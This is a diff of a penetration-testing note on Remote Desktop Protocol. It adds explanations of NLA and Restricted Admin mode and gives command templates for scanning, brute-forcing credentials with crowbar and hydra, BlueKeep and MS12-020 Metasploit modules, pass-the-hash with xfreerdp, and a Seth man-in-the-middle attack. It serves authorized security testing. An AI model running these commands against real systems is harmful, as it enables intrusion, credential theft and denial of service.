@@ -2,43 +2,83 @@
 
 ### Overview
 
-Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft,
-which provides a user with a graphical interface to connect to another computer
-over a network connection.
+The `Remote Desktop Protocol (RDP)` is a proprietary protocol developed by
+Microsoft, which provides a user with a graphical interface to connect to
+another computer over a network connection. The user employs `RDP` client
+software for this purpose, while the other computer must run a `RDP` server
+software.
 
-The user employs RDP client software for this purpose, while the other computer
-must run RDP server software.
-
-RDP authentication mechanism rely on Windows local or Active Directory domain
+`RDP` authentication mechanism rely on Windows local or Active Directory domain
 credentials.
 
-RDP may uses Network Level Authentication (NLA, RDP 6.0 and supported initially
-in Windows Vista / Windows Server 2008) which requires the connecting user to
-authenticate before a session is established with the server and prevents the
-use of resources on the server from the load of the graphical login screen.
+###### Network Level Authentication NLA
+
+`RDP` may uses `Network Level Authentication (NLA)`, introduced in `RDP 6.0`
+and supported initially in Microsoft Windows Vista / Windows Server 2008, which
+requires the connecting user to authenticate before a session is established
+with the server and prevents the use of resources on the server from the load
+of the graphical login screen.
+
+###### Restricted Admin mode
+
+The `Restricted Admin mode` is a security feature introduced in the Microsoft
+Windows 8.1 and Server 2012 R2 operating systems. The feature has been
+backported to Windows 7 and Server 2008.
+
+`Restricted Admin mode` prevents the connecting user's credentials to be stored
+on the remote host by transforming the logon to a `network logon` (`Type 3`)
+instead of a `remote interactive logon` (`Type 10`). Indeed, for
+`remote interactive logon`, the plaintext password is provided and the user's
+credentials are stored in the `LSASS` process of the remote host. In
+`Restricted Admin mode`, no form of credentials (plaintext password, `LM` /
+`NTLM` hashes or `kerberos` `TGT`) are stored on the remote host.
+
+`Restricted Admin mode` must be enabled on the remote host
+(`DisableRestrictedAdmin` registry key to (`REG_DWORD`) `0` which is not the
+case by default) and the client must connect in `Restricted Admin mode` (for
+example: `mstsc.exe /restrictedAdmin`). Note that enabling `Restricted Admin
+mode` allow `Pass-the-hash` authentication over `RDP`.
+
+Only members of the local `Administrators` group may authenticate in
+`Restricted Admin` mode and the network identity (for remote access over the
+network) of the `RDP` session will, by default, be authenticated using the
+`RDP` host machine account. This authentication using the `RDP` host machine
+account can be disabled by setting the `DisableRestrictedAdminOutboundCreds`
+registry key to (`REG_DWORD`) `1`.
 
 ### Network scan
 
-Nmap can be used to scan the network for RDP services:
+`Nmap` and the `Metasploit`'s `auxiliary/scanner/rdp/rdp_scanner` module can be
+used to scan the network for `RDP` services.
+
+`Nmap`'s service and default `RDP` scripts scan may allow for the retrieval of
+information about the hosts (`NetBIOS` / `DNS` hostname, Windows product
+version, `SSL` / `TLS` subject and issuer, etc.). `Metasploit`'s
+`auxiliary/scanner/rdp/rdp_scanner` module will check whether or not `NLA` is
+enabled.
 
 ```
-nmap -v -p 3389 -A -oA nmap_rdp <RANGE | CIDR>
+nmap -n -Pn -v -p 3389 -sV -sC -oA <NMAP_OUTPUT> <RANGE | CIDR>
+
+msf > use auxiliary/scanner/rdp/rdp_scanner
+msf auxiliary(scanner/rdp/rdp_scanner) > set RHOSTS <HOSTNAME | IP | CIDR | file:<PATH>>
 ```
 
 ### Authentication brute force
 
 The local or Active Directory domain account lockout policies apply
-(depending on the type of authentication tried) when connecting with RDP.
-Vertical brute forcing is thus not possible.
+(depending on the type of authentication tried) when connecting in `RDP`.
+Vertical brute forcing may thus not be possible.
 
-However, horizontal RDP brute forcing can be used for lateral movement once
-an account has been compromised. Indeed, the compromised account may not be an
-local Administrator (and thus can not connect through PsExec like tool) but can
-be a member of the Remote Desktop Users group.
+However, horizontal `RDP` brute forcing can be used for lateral movement once
+an account has been compromised. Indeed, the compromised account may not be a
+member of the local `Administrators` group (and thus can not connect through
+`PsExec` like tool for example) but can be a member of the `Remote Desktop
+Users` group.
 
-Patator, Hydra or the crowbar Python Script can be used to brute force RDP
-access. Patator and crowbar both support NLA (as of December 2018, Patator does
-not support no NLA RDP brute force).
+`Patator`, `Hydra` or the `crowbar` Python Script can be used to brute force
+`RDP` access. `Patator` and `crowbar` both support `NLA` (as of December 2018,
+`Hydra` does not support no NLA RDP brute force).
 
 ```
 python crowbar.py -b rdp (-u <USERNAME | <DOMAIN\\USERNAME> | -U USERNAME_FILE) (-c <PASSWORD> | -C <PASSWORDS_LIST) -s <CIDR>
@@ -48,8 +88,9 @@ hydra -t 1 -V -l <USERNAME> (-p <PASSWORD> | -P <PASSWORDS_LIST) rdp://<IP | HOS
 
 ### Known vulnerabilities
 
-`nmap` can be used to check for the CVE-2012-0002 / MS12-020 exploit.
-The `Metasploit`'s `auxiliary/scanner/rdp/cve_2019_0708_bluekeep` module and `rdpscan` can be used to scan for BlueKeep CVE-2019-0708
+`nmap` can be used to check for the `CVE-2012-0002` / `MS12-020` exploit.
+The `Metasploit`'s `auxiliary/scanner/rdp/cve_2019_0708_bluekeep` module and
+`rdpscan` can be used to scan for `BlueKeep` / `CVE-2019-0708`.
 
 ```
 # BlueKeep CVE-2019-0708
@@ -88,10 +129,11 @@ msf> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
 
 ###### CVE-2012-0002 / MS12-020
 
-The CVE-2012-0002 / MS12-020 vulnerability can be used both to realize a Denial
-Of Service and remotely execute code on the target.
+The `CVE-2012-0002` / `MS12-020` vulnerability can be used both to realize a
+Denial Of Service and remotely execute code on the target.
 
-A metasploit module is available to realize a DoS of the target:
+The `Metasploit`'s `auxiliary/dos/windows/rdp/ms12_020_maxchannelids` may be
+used to realize a `DoS` of the target:
 
 ```
 msf> use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
@@ -104,47 +146,56 @@ code execution is available.
 
 ###### Windows
 
-On Windows, the default Microsoft Remote Desktop application
-("Connexion Bureau à distance") or the Remote Desktop Manager third party
-application can be used as RDP clients.
+On Windows, the default `Microsoft Remote Desktop` application
+("Connexion Bureau à distance") or the `Remote Desktop Manager` third party
+application can be used as `RDP` clients.
 
-The Remote Desktop Manager allows for the configuration and storing of
-multiples RDP connection (host and authentication information). A Free Edition
-is available as well as a commercial grade Enterprise Edition.
+The `Remote Desktop Manager` allows for the configuration and storing of
+multiples `RDP` connection (host and authentication information). A free
+edition is available as well as a commercial grade enterprise edition.
 
 ###### Linux
 
-On Linux, rdesktop or Remmina (GUI) can be used as RDP clients.
+On Linux, `FreeRDP` (`xfreerdp`), `rdesktop` or `Remmina` (GUI) can be used as
+`RDP` clients.
 
 ```
-rdesktop [options] server[:port]
+xfreerdp /u:'<DOMAIN | WORKGROUP>\<USERNAME>' /p:'<PASSWORD>' /v:<HOSTNAME | IP>[:<PORT>]
+# No NLA for host that do not require NLA.
+xfreerdp -sec-nla /v:<HOSTNAME | IP>
+xfreerdp -sec-nla /u:'<DOMAIN | WORKGROUP>\<USERNAME>' /p:'<PASSWORD>' /v:<HOSTNAME | IP>
+# Restricted admin mode.
+xfreerdp /restricted-admin /u:'<DOMAIN | WORKGROUP>\<USERNAME>' /p:'<PASSWORD>' /v:<HOSTNAME | IP>
+
+rdesktop -d '<DOMAIN | WORKGROUP>' -u '<USERNAME>' <HOSTNAME | IP>[:<PORT>]
+
 Remmina
 ```
 
 ### Pass-the-hash over RDP
 
-FreeRDP can be used to authenticate using the hash through RDP against hosts
-using the Restricted Admin mode feature.
+`FreeRDP` can be used to authenticate using the hash through RDP against hosts
+using the `Restricted Admin mode` feature.
 
 ```
-xfreerdp /u:<USERNAME> /d:<DOMAIN> /pth:<HASH> /v:<HOST | IP>
+xfreerdp /u:'<DOMAIN | WORKGROUP>\<USERNAME>' /pth:<HASH> /v:<HOSTNAME | IP>
 ```
 
 ### Man-in-the-middle attack
 
-Seth is a tool written in Python and Bash to MitM RDP connections that
+`Seth` is a tool written in Python and Bash to MitM `RDP` connections that
 attempts to downgrade the connection in order to extract clear text credentials.
 
-Seth can be used regardless if Network Level Authentication (NLA) is enabled
-on the RDP host.
+`Seth` can be used regardless if `Network Level Authentication (NLA)` is
+enabled or not on the targeted `RDP` host.
 
-Seth will notably:
-  - Spoof ARP replies to redirect traffic from the victim host to the attacker
-  machine and then to the target RDP server.
-  - Configure an iptable rule to reject SYN packet to prevent direct RDP
-  authentication.
-  - Clone the SSL certificate (only replacing the public key and signature)
-  - Block traffic to port 88 to downgrade Kerberos authentication to NTLM.
+`Seth` will notably:
+  - Spoof `ARP` replies to redirect traffic from the victim host to the
+    attacker machine and then to the target RDP server.
+  - Configure an `iptable` rule to reject `SYN` packet to prevent direct `RDP`
+    authentication.
+  - Clone the `SSL` certificate (only replacing the public key and signature)
+  - Block traffic to port 88 to downgrade `Kerberos` authentication to `NTLM`.
 
 Note that the user will be presented with a certificate error warning that must
 be accepted before the clear text credentials are sent.
@@ -154,8 +205,6 @@ In case of a successful attack:
   - Clear text credentials of the user login in are obtained
   - A command can be executed on the targeted host
   - Victim keyboard inputs are retrieved
-
-Usage:
 
 ```
 # Unless the RDP host is on the same subnet as the victim machine, the last IP address must be that of the gateway.
@@ -167,8 +216,9 @@ seth.sh <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP | HOST_IP> [<COMMAND>]
 
 ### Session Hijacking
 
-If Administrator / SYSTEM privileges could be obtained on a host, RDP sessions
-of others users can be hijacked. This could be used to access the
-host as the hijacked user through a GUI interface with out knowing its password.  
+If `Administrator` / `NT AUTHORITY\SYSTEM` privileges could be obtained on a
+host, `RDP` sessions of others users can be hijacked. This could be used to
+access the host as the hijacked user through a GUI interface with out knowing
+its password.  
 
-To hijack RDP session refer to the `[Windows] Post Exploitation` note.
+To hijack `RDP` session refer to the `[Windows] Post Exploitation` note.
